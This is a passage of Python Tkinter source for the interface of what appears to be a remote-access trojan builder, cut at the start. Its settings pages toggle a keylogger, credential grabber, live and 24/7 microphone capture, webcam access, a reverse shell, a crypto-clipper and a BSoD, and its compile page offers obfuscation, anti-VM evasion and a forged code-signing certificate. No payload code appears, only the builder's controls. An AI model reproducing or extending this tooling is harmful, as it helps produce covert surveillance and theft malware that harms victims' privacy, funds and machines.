            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][5]['pos_x'],
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['labels'][5]['pos_y'],
            text='Implode Password:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.E)
        
        self.implode_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            width=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][5]['width'],
            show='*')
        
        self.implode_entry.insert(0, self.malware_configuration['implode_secret'])
        self.implode_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['implode_entry']))
        self.implode_entry.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][5]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][5]['pos_y'],
            window=self.implode_entry, 
            anchor='w')

    def functionality_settings(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.DISABLED
        self.functionality_settings_button['relief'] = 'flat'
        self.compiling_settings_button['state'] = tk.NORMAL
        self.compiling_settings_button['relief'] = 'groove'
        self.save_configuration(True, from_window=self.current_window)
        self.current_window = 2
        self.new_background(2)
        self.load_configuration(False)

        x_start, y_start, x_delta, y_delta = builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['x_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['y_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['x_delta'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['y_delta']

        self.cbvar_keylogr = tk.BooleanVar(value=True)
        self.cb_keylogr = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='keylogger',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_keylogr,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['keylogr']))
        self.cb_keylogr.bind("<Leave>", self.hide_tooltip)
        self.cbvar_keylogr.set(self.malware_configuration['functionalities']['keylogr'])
        self.canvas.create_window(x_start, y_start+y_delta*0, window=self.cb_keylogr, anchor='w')

        self.cbvar_scrnsht = tk.BooleanVar(value=True)
        self.cb_scrnsht = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='take screenshots',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_scrnsht,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnsht']))
        self.cb_scrnsht.bind("<Leave>", self.hide_tooltip)
        self.cbvar_scrnsht.set(self.malware_configuration['functionalities']['scrnsht'])
        self.canvas.create_window(x_start, y_start+y_delta*1, window=self.cb_scrnsht, anchor='w')

        self.cbvar_fmanag = tk.BooleanVar(value=True)
        self.cb_fmanag = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='file management',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_fmanag,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_fmanag.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['f_manag']))
        self.cb_fmanag.bind("<Leave>", self.hide_tooltip)
        self.cbvar_fmanag.set(self.malware_configuration['functionalities']['f_manag'])
        self.canvas.create_window(x_start, y_start+y_delta*2, window=self.cb_fmanag, anchor='w')

        self.cbvar_grabber = tk.BooleanVar(value=True)
        self.cb_grabber = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='grabber',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_grabber,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_grabber.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['grabber']))
        self.cb_grabber.bind("<Leave>", self.hide_tooltip)
        self.cbvar_grabber.set(self.malware_configuration['functionalities']['grabber'])
        self.canvas.create_window(x_start, y_start+y_delta*3, window=self.cb_grabber, anchor='w')

        self.cbvar_mclive = tk.BooleanVar(value=True)
        self.cb_mclive = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='stream live microphone',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_mclive,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['mc_live']))
        self.cb_mclive.bind("<Leave>", self.hide_tooltip)
        self.cbvar_mclive.set(self.malware_configuration['functionalities']['mc_live'])
        self.canvas.create_window(x_start, y_start+y_delta*4, window=self.cb_mclive, anchor='w')

        self.cbvar_mcrecc = tk.BooleanVar(value=True)
        self.cb_mcrecc = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='24/7 microphone recording',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_mcrecc,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['mc_recc']))
        self.cb_mcrecc.bind("<Leave>", self.hide_tooltip)
        self.cbvar_mcrecc.set(self.malware_configuration['functionalities']['mc_recc'])
        self.canvas.create_window(x_start, y_start+y_delta*5, window=self.cb_mcrecc, anchor='w')

        self.cbvar_process = tk.BooleanVar(value=True)
        self.cb_process = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='manage processes',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_process,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['process']))
        self.cb_process.bind("<Leave>", self.hide_tooltip)
        self.cbvar_process.set(self.malware_configuration['functionalities']['process'])
        self.canvas.create_window(x_start, y_start+y_delta*6, window=self.cb_process, anchor='w')

        self.cbvar_revshl = tk.BooleanVar(value=True)
        self.cb_revshl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='reverse shell',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_revshl,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['rev_shl']))
        self.cb_revshl.bind("<Leave>", self.hide_tooltip)
        self.cbvar_revshl.set(self.malware_configuration['functionalities']['rev_shl'])
        self.canvas.create_window(x_start, y_start+y_delta*7, window=self.cb_revshl, anchor='w')
        
        self.cbvar_webcam = tk.BooleanVar(value=True)
        self.cb_webcam = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='webcam handling',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_webcam,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_webcam.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['webcam_']))
        self.cb_webcam.bind("<Leave>", self.hide_tooltip)
        self.cbvar_webcam.set(self.malware_configuration['functionalities']['webcam_'])
        self.canvas.create_window(x_start, y_start+y_delta*8, window=self.cb_webcam, anchor='w')

        self.cbvar_scrnrec = tk.BooleanVar(value=True)
        self.cb_scrnrec = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screen recording',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_scrnrec,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_scrnrec.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnrec']))
        self.cb_scrnrec.bind("<Leave>", self.hide_tooltip)
        self.cbvar_scrnrec.set(self.malware_configuration['functionalities']['scrnrec'])
        self.canvas.create_window(x_start, y_start+y_delta*9, window=self.cb_scrnrec, anchor='w')

        self.cbvar_inputbl = tk.BooleanVar(value=True)
        self.cb_inputbl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='input blocking',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_inputbl,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_inputbl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['inputbl']))
        self.cb_inputbl.bind("<Leave>", self.hide_tooltip)
        self.cbvar_inputbl.set(self.malware_configuration['functionalities']['inputbl'])
        self.canvas.create_window(x_start, y_start+y_delta*10, window=self.cb_inputbl, anchor='w')

        self.cbvar_crclipr = tk.BooleanVar(value=True)
        self.cb_crclipr = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='crypto-clipper',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_crclipr,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_crclipr.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['crclipr']))
        self.cb_crclipr.bind("<Leave>", self.hide_tooltip)
        self.cbvar_crclipr.set(self.malware_configuration['functionalities']['crclipr'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*0, window=self.cb_crclipr, anchor='w')

        self.cbvar_messger = tk.BooleanVar(value=True)
        self.cb_messger = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='messager',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_messger,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_messger.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['messger']))
        self.cb_messger.bind("<Leave>", self.hide_tooltip)
        self.cbvar_messger.set(self.malware_configuration['functionalities']['messger'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*1, window=self.cb_messger, anchor='w')

        self.cbvar_txtspee = tk.BooleanVar(value=True)
        self.cb_txtspee = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='Text-to-Speech',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_txtspee,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_txtspee.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['txtspee']))
        self.cb_txtspee.bind("<Leave>", self.hide_tooltip)
        self.cbvar_txtspee.set(self.malware_configuration['functionalities']['txtspee'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*2, window=self.cb_txtspee, anchor='w')

        self.cbvar_audctrl = tk.BooleanVar(value=True)
        self.cb_audctrl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='audio controlling',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_audctrl,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_audctrl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['audctrl']))
        self.cb_audctrl.bind("<Leave>", self.hide_tooltip)
        self.cbvar_audctrl.set(self.malware_configuration['functionalities']['audctrl'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*3, window=self.cb_audctrl, anchor='w')

        self.cbvar_monctrl = tk.BooleanVar(value=True)
        self.cb_monctrl = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='monitors controlling',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_monctrl,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_monctrl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['monctrl']))
        self.cb_monctrl.bind("<Leave>", self.hide_tooltip)
        self.cbvar_monctrl.set(self.malware_configuration['functionalities']['monctrl'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*4, window=self.cb_monctrl, anchor='w')

        self.cbvar_webbloc = tk.BooleanVar(value=True)
        self.cb_webbloc = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='website blocking',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_webbloc,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_webbloc.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['webbloc']))
        self.cb_webbloc.bind("<Leave>", self.hide_tooltip)
        self.cbvar_webbloc.set(self.malware_configuration['functionalities']['webbloc'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*5, window=self.cb_webbloc, anchor='w')

        self.cbvar_jmpscar = tk.BooleanVar(value=True)
        self.cb_jmpscar = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='jumpscare',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_jmpscar,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_jmpscar.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['jmpscar']))
        self.cb_jmpscar.bind("<Leave>", self.hide_tooltip)
        self.cbvar_jmpscar.set(self.malware_configuration['functionalities']['jmpscar'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*6, window=self.cb_jmpscar, anchor='w')

        self.cbvar_keystrk = tk.BooleanVar(value=True)
        self.cb_keystrk = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='keystroke type',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_keystrk,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_keystrk.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['keystrk']))
        self.cb_keystrk.bind("<Leave>", self.hide_tooltip)
        self.cbvar_keystrk.set(self.malware_configuration['functionalities']['keystrk'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*7, window=self.cb_keystrk, anchor='w')

        self.cbvar_scrnman = tk.BooleanVar(value=True)
        self.cb_scrnman = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='screen manipulation',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_scrnman,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_scrnman.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnman']))
        self.cb_scrnman.bind("<Leave>", self.hide_tooltip)
        self.cbvar_scrnman.set(self.malware_configuration['functionalities']['scrnman'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*8, window=self.cb_scrnman, anchor='w')

        self.cbvar_bluesod = tk.BooleanVar(value=True)
        self.cb_bluesod = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='BSoD',
            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
            variable=self.cbvar_bluesod,
            
            onvalue=True,
            offvalue=False
        )
        self.cb_bluesod.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['bluesod']))
        self.cb_bluesod.bind("<Leave>", self.hide_tooltip)
        self.cbvar_bluesod.set(self.malware_configuration['functionalities']['bluesod'])
        self.canvas.create_window(x_start*x_delta, y_start+y_delta*9, window=self.cb_bluesod, anchor='w')

    def compiling_settings(self):
        self.general_settings_button['state'] = tk.NORMAL
        self.general_settings_button['relief'] = 'groove'
        self.functionality_settings_button ['state'] = tk.NORMAL
        self.functionality_settings_button['relief'] = 'groove'
        self.compiling_settings_button['state'] = tk.DISABLED
        self.compiling_settings_button['relief'] = 'flat'
        self.save_configuration(True, from_window=self.current_window)
        self.current_window = 3
        self.load_configuration(False)
        self.new_background(3)

        self.time_check = time.time()
        
        self.cbvar_obfuscation = tk.BooleanVar(value=True)
        self.cb_obfuscation = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='obfuscation',
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['font_size']),
            variable=self.cbvar_obfuscation,
            command=lambda:self.double_click_settings('obfuscation'),
            onvalue=True,
            offvalue=False
        )
        self.cbvar_obfuscation.set(self.malware_configuration['obfuscation']['enabled'])
        self.cb_obfuscation.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['obfuscation']))
        self.cb_obfuscation.bind("<Leave>", self.hide_tooltip)
        
        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['checkboxes'][0]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['checkboxes'][0]['pos_y'], 
            window=self.cb_obfuscation, 
            anchor='w')
        self.cbvar_antivm = tk.BooleanVar(value=True)
        self.cb_antivm = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='anti-VM',
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['font_size']),
            variable=self.cbvar_antivm,
            command=lambda:self.double_click_settings('antivm'),
            onvalue=True,
            offvalue=False
        )
        self.cbvar_antivm.set(self.malware_configuration['anti_vm']['enabled'])
        self.cb_antivm.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['anti_vm']))
        self.cb_antivm.bind("<Leave>", self.hide_tooltip)

        self.canvas.create_window(
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['checkboxes'][1]['pos_x'], 
            builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['checkboxes'][1]['pos_y'],
            window=self.cb_antivm, 
            anchor='w')
        self.cbvar_debugmode = tk.BooleanVar(value=False)
        self.cb_debugmode = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='debug mode',
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['font_size']),
            variable=self.cbvar_debugmode,
            onvalue=True,
            offvalue=False
        )
        self.cbvar_debugmode.set(self.malware_configuration['debug_mode'])
        self.cb_debugmode.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['debugmode']))
        self.cb_debugmode.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(
            100,
            155,
            window=self.cb_debugmode, 
            anchor='w')

        self.canvas.create_text(
            100,
            205,
            text='Icon:', 
            fill='white', 
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
            anchor=tk.W)   
        self.icon_photo = ImageTk.PhotoImage(Image.open(self.malware_configuration['icon_path']).resize((100, 100)))
        self.icon_button = tk.Button(self.canvas, relief='flat', cursor='hand2', image=self.icon_photo, state=tk.NORMAL, width=100, height=100, command=self.change_icon)
        self.icon_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['icon']))
        self.icon_button.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(
            100,
            220,
            window=self.icon_button,
            anchor='nw')
        
        self.cbvar_certificate = tk.BooleanVar(value=True)
        self.cb_certificate = tk.Checkbutton(
            self.canvas,
            selectcolor='#0A0A10',
            text='digital certificate',
            font=(
                'Consolas', 
                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['font_size']),
            variable=self.cbvar_certificate,
            command=lambda:self.double_click_settings('certificate'),
            onvalue=True,
            offvalue=False
        )
        self.cbvar_certificate.set(self.malware_configuration['digital_certificate']['enabled'])
        self.cb_certificate.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['certificate']))
        self.cb_certificate.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(
            350, 
            75,
            window=self.cb_certificate, 
            anchor='w')

        self.canvas.create_text(
            375, 
            100, 
            text='Producer Name:', 
            fill='white', 
            font=(
                'Consolas', 
                10), 
            anchor='w')
        self.cert_producer_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=14), 
            disabledbackground='#000000',
            width=20)
        self.cert_producer_entry.insert(0, self.malware_configuration['digital_certificate']['producer_name'])
        self.cert_producer_entry['state'] = tk.NORMAL if self.malware_configuration['digital_certificate']['enabled'] else tk.DISABLED
        self.cert_producer_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['certificate_producername']))
        self.cert_producer_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(
            375, 
            120, 
            window=self.cert_producer_entry, 
            anchor='w')

        self.canvas.create_text(
            375, 
            150, 
            text='e-Mail Address:', 
            fill='white', 
            font=(
                'Consolas', 
                10), 
            anchor='w')    
        self.cert_mail_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=14), 
            disabledbackground='#000000',
            width=20)
        self.cert_mail_entry.insert(0, self.malware_configuration['digital_certificate']['email_address'])
        self.cert_mail_entry['state'] = tk.NORMAL if self.malware_configuration['digital_certificate']['enabled'] else tk.DISABLED
        self.cert_mail_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['certificate_email']))
        self.cert_mail_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(
            375, 
            170, 
            window=self.cert_mail_entry, 
            anchor='w')

        self.canvas.create_text(
            375, 
            200, 
            text='Validity in seconds:',
            fill='white', 
            font=(
                'Consolas', 
                10), 
            anchor='w')
        self.cert_validity_entry = tk.Entry(
            self.canvas, 
            font=tkFont.Font(
                family='Consolas', 
                size=14), 
            disabledbackground='#000000',
            width=20)
        self.cert_validity_entry.insert(0, self.malware_configuration['digital_certificate']['validity_end_in_seconds'])
        self.cert_validity_entry['state'] = tk.NORMAL if self.malware_configuration['digital_certificate']['enabled'] else tk.DISABLED
        self.cert_validity_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['certificate_validity']))
        self.cert_validity_entry.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(
            375, 
            220, 
            window=self.cert_validity_entry, 
            anchor='w')







        self.compile_button = tk.Button(self.canvas, cursor='hand2', text='Compile', font='Consolas', state=tk.NORMAL, command=self.compile)
        self.compile_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['compile']))
        self.compile_button.bind("<Leave>", self.hide_tooltip)
        self.canvas.create_window(
            690,
            450,
            window=self.compile_button,
            anchor='se')




        # Icon
        # Anti-VM   /w advanced options
        # Obfuscation
        




def main():
    global builder_configuration
    root = tk.Tk()
    #root.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'])+'x'+str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['height']))
    
    
    root.wm_attributes('-transparentcolor', '#fe00ff')
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')

    sw = int(root.winfo_screenwidth()/2)
    sh = int(root.winfo_screenheight()/2)
    sizex = int(700/2)
    sizey = int(520/2)

    size_y = 80
    size_x = 0
    Builder(root)

    for i in range(25):
        size_x += 28
        root.geometry(f'{size_x}x{size_y}+{sw-sizex}+{sh-sizey}')
        root.update()

    for i in range(23):
        size_y += 20
        root.geometry(f'{size_x}x{size_y}+{sw-sizex}+{sh-sizey}')
        root.update()

    
    
    
    
    root.geometry(f'700x520+{sw-sizex}+{sh-sizey}')
    
    
    root.mainloop()

if __name__ == '__main__':
    main()